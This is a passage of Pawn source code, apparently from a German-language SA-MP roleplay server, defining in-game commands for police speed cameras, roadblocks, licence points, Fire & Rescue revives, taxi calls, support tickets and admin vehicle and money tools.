	if(!IstSpielerInFrak(playerid,1) && !IstSpielerInFrak(playerid,2)&& !IstSpielerInFrak(playerid,15)) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Polizist/Army!");
	for(new x = 0; x < 3; x++)
	{
		if(IsPlayerInRangeOfPoint(playerid,3,Blitzer[x][blitzx],Blitzer[x][blitzy],Blitzer[x][blitzz]))
		{
			Blitzer[x][blitzx] = 0;
			Blitzer[x][blitzy] = 0;
			Blitzer[x][blitzz] = 0;
			Blitzer[x][blitza] = 0;
			Blitzer[x][blitzgw] = 0;
			DestroyDynamicObject(Blitzer[x][blitzcreate]);
			Blitzer[x][blitzcreate] = -1;
			SendClientMessage(playerid,COLOR_GREEN,"Blitzer entfernt!");
		}
	}
	return 1;
}
cmd:rsperre(playerid,params[])
{
    printf("%s rsperre",PlayerName(playerid));
	if(!IstSpielerInFrak(playerid,1) && !IstSpielerInFrak(playerid,2) && !IstSpielerInFrak(playerid,4)&& !IstSpielerInFrak(playerid,3)&& !IstSpielerInFrak(playerid,15)) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Polizist/Army!");
    for(new x = 0; x < MAX_SPERRE; x++)
    {
        if(Sperre[x][sperreid] == 1)
        {
			DestroyDynamicObject(Sperre[x][sperrecreate]);
        }
        Sperre[x][sperreid] = -1;
    }
    SendClientMessage(playerid,COLOR_GREEN,"Alle Sperren entfernt!");
	return 1;
}
cmd:sperre(playerid,params[])
{
    printf("%s sperre",PlayerName(playerid));
	if(!IstSpielerInFrak(playerid,1) && !IstSpielerInFrak(playerid,2) && !IstSpielerInFrak(playerid,4)&& !IstSpielerInFrak(playerid,3)&& !IstSpielerInFrak(playerid,15)) return SendClientMessage(playerid,COLOR_RED,"Du bist nicht bei der Polizei.");
    for(new x = 0; x < MAX_SPERRE  ; x++)
    {
        if(Sperre[x][sperreid] == -1)
        {
            new Float:x2,Float:y2,Float:z2,Float:a2;
            GetPlayerPos(playerid,x2,y2,z2);
            GetPlayerFacingAngle(playerid,a2);
			Sperre[x][sperrecreate]=CreateDynamicObjectEx(1459,x2,y2,z2-0.5,0,0,a2,150,150);
			Sperre[x][sperreid] = 1;
			SendClientMessage(playerid,COLOR_GREEN,"Sperre platziert!");
			break;
        }
    }
	return 1;
}
cmd:eblitzer(playerid,params[])
{
    printf("%s eblitzer",PlayerName(playerid));
	new geschw,str[150];
	if(!IstSpielerInFrak(playerid,1) && !IstSpielerInFrak(playerid,2)) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Polizist/Army!");
    if(sscanf(params, "d",geschw)) return SendClientMessage(playerid,COLOR_RED,"Benutze /blitzer [Geschwindigkeit]");
    if(geschw > 49)
    {
		if(Blitzer[0][blitzcreate] == -1)
		{
			new Float:x,Float:y,Float:z,Float:a;
			GetPlayerPos(playerid,x,y,z);
			GetPlayerFacingAngle(playerid,a);
			Blitzer[0][blitzx] = x;
			Blitzer[0][blitzy] = y;
			Blitzer[0][blitzz] = z;
			Blitzer[0][blitza] = a;
			Blitzer[0][blitzgw] = geschw;
			format(str,sizeof(str),"Du hast deinen Blitzer erstellt. Maximale Geschwindigkeit: %d",geschw);
			SendClientMessage(playerid,COLOR_GREEN,str);
			Blitzer[0][blitzcreate] = CreateDynamicObjectEx(18880,Blitzer[0][blitzx],Blitzer[0][blitzy],Blitzer[0][blitzz]-1,0,0,Blitzer[0][blitza],150,150);
		}
		else if(Blitzer[1][blitzcreate] == -1)
		{
			new Float:x,Float:y,Float:z,Float:a;
			GetPlayerPos(playerid,x,y,z);
			GetPlayerFacingAngle(playerid,a);
			Blitzer[1][blitzx] = x;
			Blitzer[1][blitzy] = y;
			Blitzer[1][blitzz] = z;
			Blitzer[1][blitza] = a;
			Blitzer[1][blitzgw] = geschw;
			format(str,sizeof(str),"Du hast deinen Blitzer erstellt. Maximale Geschwindigkeit: %d",geschw);
			SendClientMessage(playerid,COLOR_GREEN,str);
			Blitzer[1][blitzcreate] = CreateDynamicObjectEx(18880,Blitzer[1][blitzx],Blitzer[1][blitzy],Blitzer[1][blitzz]-1,0,0,Blitzer[1][blitza],150,150);
		}
		else if(Blitzer[2][blitzcreate] == -1)
		{
			new Float:x,Float:y,Float:z,Float:a;
			GetPlayerPos(playerid,x,y,z);
			GetPlayerFacingAngle(playerid,a);
			Blitzer[2][blitzx] = x;
			Blitzer[2][blitzy] = y;
			Blitzer[2][blitzz] = z;
			Blitzer[2][blitza] = a;
			Blitzer[2][blitzgw] = geschw;
			format(str,sizeof(str),"Du hast deinen Blitzer erstellt. Maximale Geschwindigkeit: %d",geschw);
			SendClientMessage(playerid,COLOR_GREEN,str);
			Blitzer[2][blitzcreate] = CreateDynamicObjectEx(18880,Blitzer[2][blitzx],Blitzer[2][blitzy],Blitzer[2][blitzz]-1,0,0,Blitzer[2][blitza],150,150);
		}
		else
		{
		    SendClientMessage(playerid,COLOR_RED,"Es gibt bereits 3 Blitzer!");
		}
	}
	else
	{
	    SendClientMessage(playerid,COLOR_RED,"Mindestgeschwindigkeit liegt bei 50 KM/H");
	}
	return 1;
}
cmd:punkteleeren(playerid,params[])
{
    printf("%s punkteleeren",PlayerName(playerid));
	new str[80];
    if(!IstSpielerInFrak(playerid,1) && !IstSpielerInFrak(playerid,2)&& !IstSpielerInFrak(playerid,15)) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Polizist/Army!");
    if(sscanf(params, "r",giveplayerid)) return SendClientMessage(playerid,COLOR_RED,"Benutze /punkteleeren [Name/ID]");
	format(str,sizeof(str),"Polizist %s hat deine Punkte gelöscht!",PlayerName(playerid));
	SendClientMessage(giveplayerid,COLOR_YELLOW,str);
	format(str,sizeof(str),"Du hast die Punkte von %s gelöscht!",PlayerName(giveplayerid));
	SendClientMessage(playerid,COLOR_YELLOW,str);
	SpielerInfo[giveplayerid][upunkte] = 0;
	return 1;
}
cmd:gebepunkte(playerid,params[])
{
    printf("%s gebepunkte",PlayerName(playerid));
	new punkte,str[120],grund[20];
    if(!IstSpielerInFrak(playerid,1) && !IstSpielerInFrak(playerid,2)&& !IstSpielerInFrak(playerid,15)) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Polizist/Army!");
    if(sscanf(params, "rds",giveplayerid,punkte,grund)) return SendClientMessage(playerid,COLOR_RED,"Benutze /gebepunkte [Name/ID][Anzahl][Grund]");
    if(punkte < 4 && punkte > 0)
    {
	    SpielerInfo[giveplayerid][upunkte] += punkte;
		format(str,sizeof(str),"Polizist %s hat dir %d Punkt/e gegeben. Du hast nun %d Punkt/e! Grund: %s",PlayerName(playerid),punkte,SpielerInfo[giveplayerid][upunkte],grund);
		SendClientMessage(giveplayerid,COLOR_YELLOW,str);
		format(str,sizeof(str),"Du hast %s %d Punkt/e geben. Er hat nun %d Punkte. Grund: %s",PlayerName(giveplayerid),punkte,SpielerInfo[giveplayerid][upunkte],grund);
		SendClientMessage(playerid,COLOR_YELLOW,str);
		format(str,sizeof(str),"Polizist %s hat %s %d Punkte vergeben. Er hat nun %d Punkte. Grund: %s",PlayerName(playerid),PlayerName(giveplayerid),punkte,SpielerInfo[giveplayerid][upunkte],grund);
		SendClientMessage(playerid,COLOR_HQ,str);
		if(SpielerInfo[giveplayerid][upunkte] >= 10)
		{
			SendClientMessage(giveplayerid,COLOR_YELLOW,"Da du 10 Punkte hast wurden dir deine Führerscheine abgenommen!");
			SpielerInfo[giveplayerid][uFuehrerschein] = 0;
			SpielerInfo[giveplayerid][uMotorradschein] = 0;
			SpielerInfo[giveplayerid][uRollerschein] = 0;
			SpielerInfo[giveplayerid][uBootsschein] = 0;
			SpielerInfo[giveplayerid][uHelischein] = 0;
			SpielerInfo[giveplayerid][uLKWschein] = 0;
			SpielerInfo[giveplayerid][uWaffenschein] = 0;
			SpielerInfo[giveplayerid][upunkte] = 0;
			SpielerInfo[giveplayerid][uTheorie] = 0;
		}
	}else{SendClientMessage(playerid,COLOR_RED,"Du kannst maximal 3 Punkte vergeben!");}
	return 1;
}
cmd:aufbrechen(playerid,params[])
{
	new fahrzeugid,Float:xx,Float:yy,Float:zz;
	if(!IstSpielerInFrak(playerid,3) && !IstSpielerInFrak(playerid,4))return SendClientMessage(playerid,COLOR_RED,"Du bist nicht Mitglied der Fire & Rescue!!");
	if(sscanf(params,"i",fahrzeugid))return SendClientMessage(playerid,COLOR_RED,"Benutze /aufbrechen [Fahrzeug-ID]");
	GetVehiclePos(fahrzeugid,xx,yy,zz);
	if(!IsPlayerInRangeOfPoint(playerid,5,xx,yy,zz))return SendClientMessage(playerid,COLOR_RED,"Du bist nicht in der Nähe von diesem Fahrzeug!");
	PutPlayerInVehicle(playerid,fahrzeugid,0);
	SendClientMessage(playerid,COLOR_GREEN,"Fahrzeug aufgebrochen!");
	return 1;
}
cmd:gebegeld(playerid,params[])
{
    printf("%s gebegeld",PlayerName(playerid));
	if(SpielerInfo[playerid][uAdmin] >= 5)
	{
		new Float:wert = 0.00;
		if(sscanf(params, "rf", giveplayerid, wert)) return SendClientMessage(playerid,COLOR_RED,"Benutze /gebegeld [Name/ID] [Anzahl]");
		GebeGeld(giveplayerid,wert);
		new string[40];
	 	format(string,sizeof string,"Du hast %s %.2f$ gegeben.",PlayerName(giveplayerid),wert+0.001);
	 	SendClientMessage(playerid,COLOR_GREEN,string);
  	}
  	else
  	{
  	KeineRechte(playerid);
  	}
  
  	return 1;
}
cmd:notrufe(playerid,params[])
{
    printf("%s notrufe",PlayerName(playerid));
    //if(SpielerInfo[playerid][uDienst] != 1)return SendClientMessage(playerid,COLOR_RED,"Du bist nicht im Dienst!");
	new stringt[130];
	new auftrage = 0;
    if(IstSpielerInFrak(playerid,1) && SpielerInfo[playerid][uDienst] == 1 || IstSpielerInFrak(playerid,2) && SpielerInfo[playerid][uDienst] == 1)
    {
 		for(new i = 0; i < MAX_PLAYERS; i++)
		{
			if(auftragsid[i] == 1 && SpielerInfo[i][uEingeloggt] == 1)
			{
				format(stringt,sizeof stringt,"%s[%d]",PlayerName(i),i);
				SendClientMessage(playerid,COLOR_GREEN,stringt);
				auftrage++;
			}
		}
	}
	else if(IstSpielerInFrak(playerid,3) && SpielerInfo[playerid][uDienst] == 1 || IstSpielerInFrak(playerid,4) && SpielerInfo[playerid][uDienst] == 1)
    {
 		for(new i = 0; i < MAX_PLAYERS; i++)
		{
			if(auftragsid[i] == 2 && SpielerInfo[i][uEingeloggt] == 1)
			{
				format(stringt,sizeof stringt,"%s[%d]",PlayerName(i),i);
				SendClientMessage(playerid,COLOR_GREEN,stringt); auftrage++;
			}
		}
	}else{SendClientMessage(playerid,COLOR_RED,"Du bist kein Staatsdiener!");}
	if(auftrage > 0)
	{
	    SendClientMessage(playerid,COLOR_GREEN,"Benutze /akzeptieren [ID] um den Auftrag anzunehmen");
	}else{SendClientMessage(playerid,COLOR_RED,"Zurzeit braucht keine Hilfe!");}
	return 1;
}
cmd:taxis(playerid,params[])
{
    new stringt[130];
	if(SpielerInfo[playerid][uJob] == 2 && GetVehicleModel(GetPlayerVehicleID(playerid)) == 420 && GetPlayerState(playerid) == PLAYER_STATE_DRIVER || SpielerInfo[playerid][uJob] == 2 && GetVehicleModel(GetPlayerVehicleID(playerid)) == 438 && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
 		new auftrage = 0;
	    for(new i = 0; i < MAX_PLAYERS; i++)
	    {
		    if(auftragsid[i] == 5 && SpielerInfo[i][uEingeloggt] == 1)
			{
				format(stringt,sizeof stringt,"%s[%d]",PlayerName(i),i);
				SendClientMessage(playerid,COLOR_GREEN,stringt);
				auftrage++;
			}
		}
		if(auftrage > 0)
		{
		    SendClientMessage(playerid,COLOR_GREEN,"Benutze /akzeptieren [ID] um den Auftrag anzunehmen");
		}else{SendClientMessage(playerid,COLOR_RED,"Zurzeit braucht keiner ein Taxi!");}
	}else{SendClientMessage(playerid,COLOR_RED,"Du bist kein Taxifahrer oder sitzt in keinem Taxi!");}
	return 1;
}
new Float:eventposx,Float:eventposy,Float:eventposz,eventaktiv;
cmd:eevent(playerid,params[])
{
    if(SpielerInfo[playerid][uAdmin] > 2)
    {
        ShowPlayerDialog(playerid,DIALOG_EVENT,DIALOG_STYLE_LIST,"Events verwalten","Event erstellen\nEvent deaktivieren","Ausführen","Abbrechen");
    }else KeineRechte(playerid);
    return 1;
}
cmd:eventstop(playerid,params[])
{
    if(SpielerInfo[playerid][uAdmin] > 2)
    {
        SendFormatMessageToAll(COLOR_YELLOW,"%s hat den Befehl /event deaktiviert!",PlayerName(playerid));
        eventaktiv = 0;
    }else KeineRechte(playerid);
	return 1;
}
cmd:eventerstellen(playerid,params[])
{
	if(SpielerInfo[playerid][uAdmin] > 2)
	{
	    if(eventaktiv == 0)
	    {
		    SendFormatMessageToAll(COLOR_YELLOW,"%s hat dein Event erstellt! Benutz /event um dem Event beizutreten.",PlayerName(playerid));
		    new Float:xx,Float:yy,Float:zz;
		    GetPlayerPos(playerid,xx,yy,zz);
		    eventposx = xx;
		    eventposy = yy;
		    eventposz = zz;
		    eventaktiv = 1;
		}else{SendClientMessage(playerid,COLOR_RED,"Es ist bereits ein Event aktiv!");}
	}else KeineRechte(playerid);
	return 1;
}
cmd:event(playerid,params[])
{
    if(eventaktiv == 1)
    {
	    SendClientMessage(playerid,COLOR_YELLOW,"Du bist dem Event beigetreten!");
		Teleport(playerid,eventposx,eventposy,eventposz);
		Freeze(playerid); SetTimerEx("Unfreeze",3000,0,"d",playerid);
	}else{SendClientMessage(playerid,COLOR_RED,"Es ist zurzeit kein Event aktiv!");}
	return 1;
}
cmd:tickets(playerid,params[])
{
    printf("%s tickets",PlayerName(playerid));
	new str[500],tickets = 0;
	if(SpielerInfo[playerid][uAdmin] > 0)
	{
	    for(new i = 0; i < MAX_PLAYERS; i++)
	    {
	        if(Ticketplayer[i] == 1)
	        {
	            tickets ++;
	            format(str,sizeof(str),"%s || Ticketnummer: %i\n%s",PlayerName(i),i,str);
	        }
	    }
	    if(tickets > 0)
	    {
	    	ShowPlayerDialog(playerid,DIALOG_SUPANN,DIALOG_STYLE_INPUT,"Support Tickets",str,"Annehmen","Abbrechen");
		}else{SendClientMessage(playerid,COLOR_RED,"Es gibt zurzeit keine Tickets!");}
	}else{KeineRechte(playerid);}
	return 1;
}
cmd:ende(playerid,params[])
{
	new str[60];
    if(Ticketmerk[playerid] >= 0)
    {
		format(str,sizeof(str),"%s hat den Support beendet!",PlayerName(playerid));
	    SendClientMessage(Ticketmerk[playerid],0xFF6400FF,str);
	    SendClientMessage(playerid,0xFF6400FF,"Du hast den Support beendet!");
	    Ticketmerk[Ticketmerk[playerid]] = -1;
	    Ticketmerk[playerid] = -1;
	}
	else{
		SendClientMessage(playerid,COLOR_RED,"Du bist in keinem Support!");
	}
	return 1;
}
cmd:fl(playerid,params[])
{
	new text[200];
	new str[200];
    if(sscanf(params, "s[190]", text)) return SendClientMessage(playerid,COLOR_RED,"Benutze /fl [TEXT]");
	if(Ticketmerk[playerid] >= 0)
	{
	    format(str,sizeof(str),"%s[%d]: %s",PlayerName(playerid),playerid,text);
	    SendClientMessage(playerid,0xFF6400FF,str);
	    format(str,sizeof(str),"%s[%d]: %s",PlayerName(playerid),playerid,text);
	    SendClientMessage(Ticketmerk[playerid],0xFF6400FF,str);
	}
	else
	{
	    SendClientMessage(playerid,COLOR_RED,"Du bist in keinem Support!");
	}
	return 1;
}
cmd:akzeptieren(playerid,params[])
{
    printf("%s akzeptieren",PlayerName(playerid));
	new pID,str[150];
	if(sscanf(params, "r", pID)) return SendClientMessage(playerid,COLOR_RED,"Benutze /akzeptieren [Name/ID]");
	if(IstSpielerInFrak(playerid,1) && SpielerInfo[playerid][uDienst] == 1 || IstSpielerInFrak(playerid,2) && SpielerInfo[playerid][uDienst] == 1)
	{
		if(auftragsid[pID] == 1)
		{
			auftragsid[pID] = 0;
		 	format(str,sizeof str,"Du hast den Auftrag von %s angenommen! Begib dich zum Checkpoint!",PlayerName(pID));
		 	SendClientMessage(playerid,COLOR_GREEN,str);
		 	format(str,sizeof str,"HQ:Officer %s hat deinen Auftrag angenommen! Warte an deiner Position",PlayerName(playerid));
		 	SendClientMessage(pID,COLOR_HQ,str);
		 	new Float:xx,Float:yy,Float:zz;
		 	GetPlayerPos(pID,xx,yy,zz);
		 	SetPlayerCheckpoint(playerid,xx,yy,zz-1,3.0);
		 	cpaktiv[playerid] = 1;
		}
		else SendClientMessage(playerid,COLOR_RED,"Der Spieler braucht keine Hilfe!");
	}
	else if(IstSpielerInFrak(playerid,3) && SpielerInfo[playerid][uDienst] == 1 || IstSpielerInFrak(playerid,4) && SpielerInfo[playerid][uDienst] == 1)
	{
		if(auftragsid[pID] == 2)
		{
			auftragsid[pID] = 0;
		 	format(str,sizeof str,"Du hast den Auftrag von %s angenommen! Begib dich zum Checkpoint!",PlayerName(pID));
		 	SendClientMessage(playerid,COLOR_GREEN,str);
		 	format(str,sizeof str,"HQ: Fire & Rescue %s hat deinen Auftrag angenommen! Warte an deiner Position",PlayerName(playerid));
		 	SendClientMessage(pID,COLOR_HQ,str);
		 	new Float:xx,Float:yy,Float:zz;
		 	GetPlayerPos(pID,xx,yy,zz);
		 	SetPlayerCheckpoint(playerid,xx,yy,zz-1,3.0);
		 	cpaktiv[playerid] = 1;
		}
		else SendClientMessage(playerid,COLOR_RED,"Der Spieler braucht keine Hilfe!");
	}
	else if(SpielerInfo[playerid][uJob] == 2)
	{
		if(auftragsid[pID] == 5)
		{
			auftragsid[pID] = 0;
		 	format(str,sizeof str,"Du hast den Auftrag von %s angenommen! Begib dich zum Checkpoint!",PlayerName(pID));
		 	SendClientMessage(playerid,COLOR_GREEN,str);
		 	format(str,sizeof str,"HQ: Taxifahrer %s hat deinen Auftrag angenommen! Warte an deiner Position",PlayerName(playerid));
		 	SendClientMessage(pID,COLOR_HQ,str);
		 	new Float:xx,Float:yy,Float:zz;
		 	GetPlayerPos(pID,xx,yy,zz);
		 	SetPlayerCheckpoint(playerid,xx,yy,zz-1,3.0);
		 	cpaktiv[playerid] = 1;
		}
		else SendClientMessage(playerid,COLOR_RED,"Der Spieler braucht keine Hilfe!");
	}
	else SendClientMessage(playerid,COLOR_RED,"Du kannst keine Aufträge annehmen!");
  	return 1;
}
cmd:auftrag(playerid,params[])
{
    printf("%s auftrag",PlayerName(playerid));
    if(!IstSpielerInFrak(playerid,3) && !IstSpielerInFrak(playerid,4))return SendClientMessage(playerid,COLOR_RED,"Du bist kein Fire & Rescue!");
    if(SpielerInfo[playerid][uDienst] != 1)return SendClientMessage(playerid,COLOR_RED,"Du bist nicht im Dienst!");
	new stringt[200];
    for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(Auftragaktiv[i] == 1 && SpielerInfo[i][uEingeloggt] == 1)
		{
			format(stringt,sizeof stringt,"%s[%d]",PlayerName(i),i);
			SendClientMessage(playerid,COLOR_GREEN,stringt);
		}
	}
	SendClientMessage(playerid,COLOR_GREEN,"Benutze /helfen um den Auftrag anzunehmen.");
	return 1;
}
cmd:helfen(playerid,params[])
{
	new str[125];
    printf("%s helfen",PlayerName(playerid));
    if(!IstSpielerInFrak(playerid,3) && !IstSpielerInFrak(playerid,4))return SendClientMessage(playerid,COLOR_RED,"Du bist kein Mitglied des Fire & Rescue Departments!");
    if(sscanf(params, "r", giveplayerid)) return SendClientMessage(playerid,COLOR_RED,"Benutze /helfen [Name/ID]");
	if(!IsPlayerConnected(giveplayerid))return SendClientMessage(playerid,COLOR_RED,"Diesen Spieler gibt es nicht!");
	if(Auftragaktiv[giveplayerid] != 1)return SendClientMessage(playerid,COLOR_RED,"Der Spieler hat keinen aktiven Auftrag!");
	format(str,sizeof(str),"Fire & Rescue %s ist unterwegs zu dir. Warte bis er eingetroffen ist.",PlayerName(playerid));
	SendClientMessage(giveplayerid,COLOR_ORANGE,str);
	format(str,sizeof(str),"Begieb dich zu %s und werde ihn wiederbeleben.",PlayerName(giveplayerid));
	SendClientMessage(playerid,COLOR_ORANGE,str);
	Auftragaktiv[giveplayerid] = 0;
	eristsani[playerid] = 1;
	HatAuftrag[playerid] = giveplayerid;
	HatAuftrag[giveplayerid] = playerid;
	new Float:xx,Float:yy,Float:zz;
	GetPlayerPos(giveplayerid,xx,yy,zz);
	SetPlayerCheckpoint(playerid,xx,yy,zz-1,3);
	cpaktiv[playerid] = 1;
	return 1;
}
cmd:wiederbeleben(playerid,params[])
{
    printf("%s wiederbeleben",PlayerName(playerid));
	new pname[MAX_PLAYER_NAME],str[100];
	new pID = HatAuftrag[playerid];
 	if(!IstSpielerInFrak(playerid,3) && !IstSpielerInFrak(playerid,4))return SendClientMessage(playerid,COLOR_RED,"Du bist kein Mitglied des Fire & Rescue Departments!");
 	if(IsPlayerInRangeOfPoint(playerid,2,todx[pID],tody[pID],todz[pID]))
 	{
	    if(SpielerInfo[pID][uTod] > 0)
	    {
	        if(SpielerInfo[playerid][uTod] == 0)
			{
	    	    ApplyAnimation(playerid,"MEDIC","CPR",1.1,1, 0, 0, 1, 0, 1);
	    	    SendClientMessage(pID,COLOR_ORANGE,"Du wirst nun behandelt.");
	    	    KillTimer(timerxd[pID]);
	    	    Spielerpid[playerid] = pID;
	    	    SetTimerEx("Wiederbelebung",5000,0,"d",playerid);
				GetPlayerName(pID,pname,sizeof(pname));
				format(str,sizeof(str),"Du hast %s wiederbelebt. Du erhälst 20$.",pname);
				SendClientMessage(playerid,COLOR_ORANGE,str);
				GebeGeld(pID,-20);
				GebeGeld(playerid,20);
				Fraktionskasse[3] += 20.0;
				Frakkassespeichern(3);
				eristsani[playerid] = -1;
				SpielerInfo[pID][uTod] = 0;
				SpielerInfo[playerid][uTod] = 0;
				GetPlayerName(playerid,pname,sizeof(pname));
				format(str,sizeof(str),"%s hat dich wiederbelebt. Behandlungskosten: 20$",pname);
				SendClientMessage(pID,COLOR_ORANGE,str);
	  		}else{SendClientMessage(playerid,COLOR_RED,"Du kannst dich nicht selber Wiederbeleben!");}
	    }else{SendClientMessage(playerid,COLOR_RED,"Diesen Spieler kann man nicht wiederbeleben!");}
    }else{SendClientMessage(playerid,COLOR_RED,"Du bist nicht in der Nähe des Spielers!");}
	return 1;
}
forward Wiederbelebung(playerid);
public Wiederbelebung(playerid)
{
    SendClientMessage(Spielerpid[playerid],COLOR_ORANGE,"Du wurdest wiederbelebt.");
    ClearAnimations(Spielerpid[playerid]);
    ClearAnimations(playerid);
    Unfreeze(Spielerpid[playerid]);
    SpielerInfo[Spielerpid[playerid]][uTod] = 0;
    GebeLeben(Spielerpid[playerid],99.8);
    Teleport(Spielerpid[playerid],todx[Spielerpid[playerid]],tody[Spielerpid[playerid]],todz[Spielerpid[playerid]]);
    SetCameraBehindPlayer(Spielerpid[playerid]);
	return 1;

}
stock CreateAHaus()
{
    new query[256];
    format(query, sizeof(query), "INSERT INTO autohaus (X) VALUES (%.3f)", iX);
    mysql_query(dbhandle, query, true);
    printf("%s",query);
    return cache_insert_id();

}
cmd:aauto(playerid,params[])
{
    printf("%s aauto",PlayerName(playerid));
	new vID,Float:vPR,automerk;
    if(SpielerInfo[playerid][uAdmin] < 3) return KeineRechte(playerid);
    if(sscanf(params, "df", vID,vPR)) return SendClientMessage(playerid,COLOR_RED,"Benutze /aauto [Model-ID] [Fahrzeugpreis]");
    new Float:plx,Float:ply,Float:plz;
    GetPlayerPos(playerid,plx,ply,plz);
	automerk = CreateAHaus();
	AutoInfo[automerk][iID] = automerk;
	AutoInfo[automerk][iModel] = vID;
	AutoInfo[automerk][iPreis] = vPR;
	AutoInfo[automerk][iX] = plx;
	AutoInfo[automerk][iY] = ply;
	AutoInfo[automerk][iZ] = plz;
	AutoInfo[automerk][erstellt] = 0;
	Autohausspeichern(automerk);
	SendClientMessage(playerid,COLOR_GREEN,"Fahrzeug erstellt. Parke es um mit /aparken");
	return 1;
}
cmd:aparken(playerid,params[])
{
    printf("%s aparken",PlayerName(playerid));
    if(SpielerInfo[playerid][uAdmin] < 3) return KeineRechte(playerid);
    new veh = GetPlayerVehicleID(playerid);
    for(new h = 0; h < MAX_AAUTOS; h++)
    {
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        if(veh == AutoInfo[h][iCreate])
	        {
	            new Float:vx,Float:vy,Float:vz,Float:va;
	            GetVehiclePos(veh,vx,vy,vz);
	            GetVehicleZAngle(veh,va);
                AutoInfo[h][iX] = vx;
				AutoInfo[h][iY] = vy;
				AutoInfo[h][iZ] = vz;
				AutoInfo[h][iA] = va;
				Autohausspeichern(h);
				SendClientMessage(playerid,COLOR_GREEN,"Fahrzeug erfolgreich umgeparkt.");
				break;
	        }
	    }else{SendClientMessage(playerid,COLOR_RED,"Du bist in keinem Fahrzeug");break;}
	}
	return 1;
}


cmd:zahlen(playerid,params[])
{
    printf("%s zahlen",PlayerName(playerid));
	new Float:geld,string[60];
    if(sscanf(params, "rf", giveplayerid,geld)) return SendClientMessage(playerid,COLOR_RED,"Benutze /zahlen [Name/ID] [Betrag]");
    if(geld < 0.00 || geld > 5000) return SendClientMessage(playerid,COLOR_RED,"Gebe einen Betrag zwischen 1Cent und 5.000$ ein!");
    if(EntfernungZwischenSpielern(playerid,giveplayerid) > 5) return SendClientMessage(playerid,COLOR_RED,"Der Spieler ist zu weit entfernt!");
	if(SpielerInfo[playerid][uGeld] < geld) return SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!");
	if(playerid == giveplayerid) return SendClientMessage(playerid,COLOR_RED,"Du kannst dir kein Geld selber geben!");
	if(SpielerInfo[playerid][uLevel] >= 5)
	{
	    if(SpielerInfo[giveplayerid][uLevel] >= 5)
	    {
			GebeGeld(playerid,-geld);
			GebeGeld(giveplayerid,geld);
			format(string,sizeof string,"%s hat dir %.2f$ gezahlt.",PlayerName(playerid),geld);
			SendClientMessage(giveplayerid,COLOR_GREEN,string);
			format(string,sizeof string,"Du hast %s %.2f$ gezahlt.",PlayerName(giveplayerid),geld);
			SendClientMessage(playerid,COLOR_GREEN,string);
		}else{SendClientMessage(playerid,COLOR_RED,"Der andere Spieler hat noch nicht Level 5 erreicht!");}
 	}
 	else{SendClientMessage(playerid,COLOR_RED,"Du hast noch nicht Level 5 erreicht!");}
	return 1;
}
cmd:geld(playerid,params[])
{
    if(SpielerInfo[playerid][uAdmin] < 2) return KeineRechte(playerid);
    printf("%s geld",PlayerName(playerid));
    if(sscanf(params, "r", giveplayerid)) return SendClientMessage(playerid,COLOR_RED,"Benutze /geld [Name/ID]");
    new string[40];
    format(string,sizeof string,"%s hat %.2f$",PlayerName(giveplayerid),SpielerInfo[giveplayerid][uGeld]+0.001);
    SendClientMessage(playerid,COLOR_GREEN,string);
    return 1;
}

cmd:veh(playerid,params[])
{
    printf("%s veh",PlayerName(playerid));
    if(SpielerInfo[playerid][uAdmin] >= 2)
    {
		new veh,color1,color2,Float:X,Float:Y,Float:Z,carid;
		if(sscanf(params,"d", veh)) return SendClientMessage(playerid,COLOR_RED,"Benutze /veh [Modell]");
		sscanf(params,"ddd", veh, color1, color2);
		GetPlayerPos(playerid,X,Y,Z);
		if(veh == 537 || veh == 538) carid = AddStaticVehicleEx(veh,X,Y,Z,-1,color1,color2,-1 );
		else carid = CreateVehicle(veh,X,Y,Z,-1,color1,color2,-1 );
		AdminVehicle[adminvehs] = carid;
		SetVehicleNumberPlate(carid,"Admincar");
		SetVehicleToRespawn(carid);
		PutPlayerInVehicle(playerid,carid,0);
		mbekommen[playerid] = 0;
		SaveCoords(carid);
		Meter[carid]=0;
		Meter2[carid]=0;
		Benzin[carid] = AutoDaten[GetVehicleModel(carid)-399][MaxBenzin];
		Motorschaden2[carid] = 0;
		if(veh == 578)
		{
	 		ADACZone[azoneid] = CreateDynamicCircle(X,Y,12);
	   		AttachDynamicAreaToVehicle(ADACZone[azoneid],carid);
	   		azoneid++;
		}
		adminvehs++;
		new engine, lights, alarm, doors, bonnet, boot, objective;
		GetVehicleParamsEx(carid, engine, lights, alarm, doors, bonnet, boot, objective);
		SetVehicleParamsEx(carid, engine, lights, alarm, VEHICLE_PARAMS_OFF, bonnet, boot, objective);
	}else{KeineRechte(playerid);}
	return 1;
}
cmd:sitin(playerid,params[])
{
    printf("%s sitin",PlayerName(playerid));
	ClearAnimations(GetPlayerID("Perso1"));
	SetPlayerSpecialAction(GetPlayerID("Perso1"),SPECIAL_ACTION_NONE);
	Unfreeze(GetPlayerID("Perso1"));
	PutPlayerInVehicle(GetPlayerID("Perso1"),GetPlayerVehicleID(playerid),1);
	return 1;
}
cmd:vehliste(playerid,params[])
{
    printf("%s vehliste",PlayerName(playerid));
    if(SpielerInfo[playerid][uAdmin] < 1) return KeineRechte(playerid);
    new string[22];
    for(new x = 0; x < sizeof(AdminVehicle); x++)
    {
        if(AdminVehicle[x] != -1)
        {
            format(string,sizeof string,"Modell: %d - ID: %d",GetVehicleModel(AdminVehicle[x]),AdminVehicle[x]);
            SendClientMessage(playerid,COLOR_ORANGE,string);
        }
    }
	return 1;
}
cmd:fixveh(playerid,params[])
{
    printf("%s fixveh",PlayerName(playerid));
    if(SpielerInfo[playerid][uAdmin] < 2) return KeineRechte(playerid);
    if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,COLOR_RED,"Du bist in keinem Fahrzeug!");
    Reparieren(GetPlayerVehicleID(playerid));
   	PlayerPlaySound(playerid,1133,0,0,0);
   	SendClientMessage(playerid,COLOR_GREEN, "Fahrzeug repariert!");
   	Motorschaden2[GetPlayerVehicleID(playerid)] = 0;
    return 1;
}
cmd:flip(playerid,params[])
{
    printf("%s flip",PlayerName(playerid));
    if(SpielerInfo[playerid][uAdmin] < 4) return KeineRechte(playerid);
